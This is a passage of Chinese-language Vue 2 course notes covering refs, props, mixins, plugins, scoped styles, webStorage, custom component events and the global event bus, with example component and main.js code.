- 获取：```this.$refs.xxx```

```
<template>
   <div>
      <h1 v-text="msg" ref="title"></h1>
      <button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
      <School ref="sch"/>
   </div>
</template>

<script>
   //引入School组件
   import School from './components/School'

   export default {
      name:'App',
      components:{School},
      data() {
         return {
            msg:'欢迎学习Vue！'
         }
      },
      methods: {
         showDOM(){
            console.log(this.$refs.title) //真实DOM元素
            console.log(this.$refs.btn) //真实DOM元素
            console.log(this.$refs.sch) //School组件的实例对象（vc）
         }
      },
   }
</script>
```

![ref相关](https://raw.githubusercontent.com/weixiaoyun/Images/vue2/ref%E7%9B%B8%E5%85%B3.png)

#### props

**作用：**用于父组件给子组件传递数据 

**备注：**

- 子组件 ==> 父组件 通信（要求父先给子一个函数）
- v-model绑定的值不能是props传过来的值，因为props是不可以修改的！
- props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。

**读取方式一: 只指定名称** 

```
props: ['name', 'age', 'setName']
```

**读取方式二: 指定名称和类型** 

```
props: {
   name: String, 
   age: Number, 
   setName: Function 
}
```

**读取方式三: 指定名称/类型/必要性/默认值** 

```
props: {
   name: {type: String, required: true, default:xxx}, 
}
```

App.vue:

```
<template>
   <div>
      <Student name="李四" sex="女" :age="18"/>
   </div>
</template>

<script>
   import Student from './components/Student'

   export default {
      name:'App',
      components:{Student}
   }
</script>
```

Student.vue:

```
<template>
   <div>
      <h1>{{msg}}</h1>
      <h2>学生姓名：{{name}}</h2>
      <h2>学生性别：{{sex}}</h2>
      <h2>学生年龄：{{myAge+1}}</h2>
      <button @click="updateAge">尝试修改收到的年龄</button>
   </div>
</template>

<script>
   export default {
      name:'Student',
      data() {
         console.log(this)
         return {
            msg:'我是一个尚硅谷的学生',
            myAge:this.age
         }
      },
      methods: {
         updateAge(){
            this.myAge++
         }
      },
      //简单声明接收
      // props:['name','age','sex'] 

      //接收的同时对数据进行类型限制
      /* props:{
         name:String,
         age:Number,
         sex:String
      } */

      //接收的同时对数据：进行类型限制+默认值的指定+必要性的限制
      props:{
         name:{
            type:String, //name的类型是字符串
            required:true, //name是必要的
         },
         age:{
            type:Number,
            default:99 //默认值
         },
         sex:{
            type:String,
            required:true
         }
      }
   }
</script>
```

### 4.mixin混合

1. 功能：可以把多个组件共用的配置提取成一个混入对象

2. 使用方式：

   第一步定义混合：

   ```
   {
       data(){....},
       methods:{....}
       ....
   }
   ```

   第二步使用混入：

   ​	全局混入：```Vue.mixin(xxx)```
   ​	局部混入：```mixins:['xxx']	```

具体配置如下：

mixin.js

```
export const hunhe = {
   methods: {
      showName(){
         alert(this.name)
      }
   },
   mounted() {
      console.log('你好啊！')
   },
}
export const hunhe2 = {
   data() {
      return {
         x:100,
         y:200
      }
   },
}
```

#### 局部引入：

Student.vue:

```
<template>
   <div>
      <h2 @click="showName">学生姓名：{{name}}</h2>
      <h2>学生性别：{{sex}}</h2>
   </div>
</template>

<script>
   import {hunhe,hunhe2} from '../mixin'

   export default {
      name:'Student',
      data() {
         return {
            name:'张三',
            sex:'男'
         }
      },
      mixins:[hunhe,hunhe2]
   }
```

School.vue:

```
<template>
   <div>
      <h2 @click="showName">学校名称：{{name}}</h2>
      <h2>学校地址：{{address}}</h2>
   </div>
</template>

<script>
   //引入一个hunhe
   import {hunhe,hunhe2} from '../mixin'

   export default {
      name:'vue',
      data() {
         return {
            name:'vue',
            address:'北京',
            x:666
         }
      },
      mixins:[hunhe,hunhe2],
   }
```

#### 全局引入：

main.js

```
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
import {hunhe,hunhe2} from './mixin'
//关闭Vue的生产提示
Vue.config.productionTip = false

Vue.mixin(hunhe)
Vue.mixin(hunhe2)


//创建vm
new Vue({
   el:'#app',
   render: h => h(App)
})
```

### 5.插件

- 功能：用于增强Vue

- 本质：包含install方法的一个对象，install的**第一个参数是Vue**，**第二个以后的参数是插件使用者传递的数据**。

- 定义插件：

  ```js
  对象.install = function (Vue, options) {
      // 1. 添加全局过滤器
      Vue.filter(....)
  
      // 2. 添加全局指令
      Vue.directive(....)
  
      // 3. 配置全局混入(合)
      Vue.mixin(....)
  
      // 4. 添加实例方法
      Vue.prototype.$myMethod = function () {...}
      Vue.prototype.$myProperty = xxxx
  }
  ```

- 使用插件：```Vue.use()```

具体配置如下：

plugins.js

```
export default {
   install(Vue,x,y,z){
      console.log(x,y,z)
      //全局过滤器
      Vue.filter('mySlice',function(value){
         return value.slice(0,4)
      })

      //定义全局指令
      Vue.directive('fbind',{
         //指令与元素成功绑定时（一上来）
         bind(element,binding){
            element.value = binding.value
         },
         //指令所在元素被插入页面时
         inserted(element,binding){
            element.focus()
         },
         //指令所在的模板被重新解析时
         update(element,binding){
            element.value = binding.value
         }
      })

      //定义混入
      Vue.mixin({
         data() {
            return {
               x:100,
               y:200
            }
         },
      })

      //给Vue原型上添加一个方法（vm和vc就都能用了）
      Vue.prototype.hello = ()=>{alert('你好啊')}
   }
}
```

main.js

```
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
import plugins from './plugins'
//关闭Vue的生产提示
Vue.config.productionTip = false

//应用（使用）插件
Vue.use(plugins,1,2,3)
//创建vm
new Vue({
   el:'#app',
   render: h => h(App)
})
```

然后在组件中可以使用插件中定义的全局指令

Student.vue

```
<template>
   <div>
      <h2>学生姓名：{{name}}</h2>
      <h2>学生性别：{{sex}}</h2>
      <input type="text" v-fbind:value="name">
   </div>
</template>

<script>
   export default {
      name:'Student',
      data() {
         return {
            name:'张三',
            sex:'男'
         }
      },
   }
</script>
```

### 6.scoped样式

- 作用：让样式在局部生效，防止冲突。
- 写法：```<style scoped>```

```
<style scoped>
   .demo{
      background-color: skyblue;
   }
</style>
```

### 7.webStorage

存储内容大小一般支持5MB左右（不同浏览器可能还不一样）

浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。

**相关API：**

1. ```xxxxxStorage.setItem('key', 'value');```
   	该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。

2. ```xxxxxStorage.getItem('person');```

   ​		该方法接受一个键名作为参数，返回键名对应的值。

3. ```xxxxxStorage.removeItem('key');```

   ​		该方法接受一个键名作为参数，并把该键名从存储中删除。

4. ``` xxxxxStorage.clear()```

   ​		该方法会清空存储中的所有数据。

**备注：**

- SessionStorage存储的内容会随着浏览器窗口关闭而消失。
- LocalStorage存储的内容，需要手动清除才会消失。
- ```xxxxxStorage.getItem(xxx)```如果xxx对应的value获取不到，那么getItem的返回值是null。
- ```JSON.parse(null)```的结果依然是null。

### 8.组件的自定义事件

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

   1. 第一种方式，在父组件中：```<Demo @xxx="test"/>```  或 ```<Demo v-on:xxx="test"/>```

   2. 第二种方式，在父组件中：

      ```js
      <Demo ref="demo"/>
      ......
      mounted(){
         this.$refs.xxx.$on('xxx',this.test)
      }
      ```

   3. 若想让自定义事件只能触发一次，可以使用```once```修饰符，或```$once```方法。

4. 触发自定义事件：```this.$emit('xxx',数据)```		

5. 解绑自定义事件```this.$off('xxx')```

6. 组件上也可以绑定原生DOM事件，需要使用```native```修饰符。

7. 注意：通过```this.$refs.xxx.$on('atguigu',回调)```绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！



App.vue:

```
<template>
   <div class="app">
      <h1>{{msg}}，学生姓名是:{{studentName}}</h1>

      <!-- 通过父组件给子组件传递函数类型的props实现：子给父传递数据 -->
      <School :getSchoolName="getSchoolName"/>

      <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第一种写法，使用@或v-on） -->
      <!-- <Student @atguigu="getStudentName" @demo="m1"/> -->

      <!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） -->
      <Student ref="student" @click.native="show"/>
   </div>
</template>

<script>
   import Student from './components/Student'
   import School from './components/School'

   export default {
      name:'App',
      components:{School,Student},
      data() {
         return {
            msg:'你好啊！',
            studentName:''
         }
      },
      methods: {
         getSchoolName(name){
            console.log('App收到了学校名：',name)
         },
         getStudentName(name,...params){
            console.log('App收到了学生名：',name,params)
            this.studentName = name
         },
         m1(){
            console.log('demo事件被触发了！')
         },
         show(){
            alert(123)
         }
      },
      mounted() {
         this.$refs.student.$on('atguigu',this.getStudentName) //绑定自定义事件
         // this.$refs.student.$once('atguigu',this.getStudentName) //绑定自定义事件（一次性）
      },
   }
</script>
```

Student.vue:利用组件自定义事件向父组件传递数据

```
<template>
   <div class="student">
      <h2>学生姓名：{{name}}</h2>
      <h2>学生性别：{{sex}}</h2>
      <h2>当前求和为：{{number}}</h2>
      <button @click="add">点我number++</button>
      <button @click="sendStudentlName">把学生名给App</button>
      <button @click="unbind">解绑atguigu事件</button>
      <button @click="death">销毁当前Student组件的实例(vc)</button>
   </div>
</template>

<script>
   export default {
      name:'Student',
      data() {
         return {
            name:'张三',
            sex:'男',
            number:0
         }
      },
      methods: {
         add(){
            console.log('add回调被调用了')
            this.number++
         },
         sendStudentlName(){
            //触发Student组件实例身上的atguigu事件
            this.$emit('atguigu',this.name,666,888,900)
            // this.$emit('demo')
            // this.$emit('click')
         },
         unbind(){
            this.$off('atguigu') //解绑一个自定义事件
            // this.$off(['atguigu','demo']) //解绑多个自定义事件
            // this.$off() //解绑所有的自定义事件
         },
         death(){
            this.$destroy() //销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效。
         }
      },
   }
</script>
```

School.vue:利用props收到父组件的方法，向父组件传递数据

```
<template>
   <div class="school">
      <h2>学校名称：{{name}}</h2>
      <h2>学校地址：{{address}}</h2>
      <button @click="sendSchoolName">把学校名给App</button>
   </div>
</template>

<script>
   export default {
      name:'School',
      props:['getSchoolName'],
      data() {
         return {
            name:'尚硅谷',
            address:'北京',
         }
      },
      methods: {
         sendSchoolName(){
            this.getSchoolName(this.name)
         }
      },
   }
</script>
```

### 9.全局事件总线

#### 理解

Vue 原型对象上包含事件处理的方法 

- $on(eventName, listener): 绑定自定义事件监听 
- $emit(eventName, data): 分发自定义事件 
- $off(eventName): 解绑自定义事件监听 
- $once(eventName, listener): 绑定事件监听, 但只能处理一次 

所有组件实例对象的原型对象的原型对象就是 Vue 的原型对象

- 所有组件对象都能看到 Vue 原型对象上的属性和方法 
- Vue.prototype.$bus = new Vue(), 所有的组件对象都能看到$bus 这个属性对象 

全局事件总线 

- 包含事件处理相关方法的对象(只有一个) 
- 所有的组件都可以得到 

#### 安装全局事件总线

```js
new Vue({
	......
	beforeCreate() {
		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
	},
    ......
}) 
```

#### 使用事件总线

接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span>

```js
methods(){
  demo(data){......}
}
......
mounted() {
  this.$bus.$on('xxxx',this.demo)
}
```

提供数据：```this.$bus.$emit('xxxx',数据)```

```
this.$bus.$emit('xxxx',this.demo)
```

最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。

```
this.$bus.$off('xxxx')
```